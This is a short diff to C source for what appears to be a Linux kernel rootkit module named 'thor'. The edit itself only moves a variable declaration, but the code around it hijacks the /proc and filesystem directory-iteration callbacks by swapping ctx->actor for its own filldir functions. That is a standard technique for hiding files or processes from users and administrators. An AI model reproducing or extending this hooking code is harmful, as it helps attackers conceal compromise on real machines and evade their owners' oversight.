@@ -207,10 +207,11 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 {
     int ret;
+    filldir_t *ctx_actor;
     // capture original filldir function
     orig_proc_filldir = ctx->actor;
     // cast away const from ctx->actor
-    filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
+    ctx_actor = (filldir_t*)(&ctx->actor);
     // store our filldir in ctx->actor
     *ctx_actor = thor_proc_filldir;
     ret = orig_proc_iterate(file, ctx);
@@ -236,10 +237,11 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t of
 static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
 {
     int ret;
+    filldir_t *ctx_actor;
     // capture original filldir function
     orig_fs_filldir = ctx->actor;
     // cast away const from ctx->actor
-    filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
+    ctx_actor = (filldir_t*)(&ctx->actor);
     // store our filldir in ctx->actor
     *ctx_actor = thor_fs_filldir;
     ret = orig_fs_iterate(file, ctx);
